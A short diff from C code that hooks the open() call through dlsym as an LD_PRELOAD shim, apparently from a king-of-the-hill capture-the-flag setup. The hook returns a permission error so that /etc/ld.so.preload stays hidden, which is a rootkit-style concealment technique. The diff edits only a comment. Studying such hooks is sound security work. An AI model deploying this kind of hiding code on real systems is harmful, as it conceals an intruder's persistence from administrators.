@@ -77,7 +77,7 @@ int open(const char *pathname, int flags, ...) {
         orig_open = dlsym(RTLD_NEXT, "open");
     }
 
-    // Hide the file descriptor for /etc/ld.so.preload and /root/king.txt
+    // Hide the file descriptor for /etc/ld.so.preload
     if (strcmp(pathname, target_file) == 0) {
         errno = EACCES; // Return permission error to prevent opening the file
         return -1;
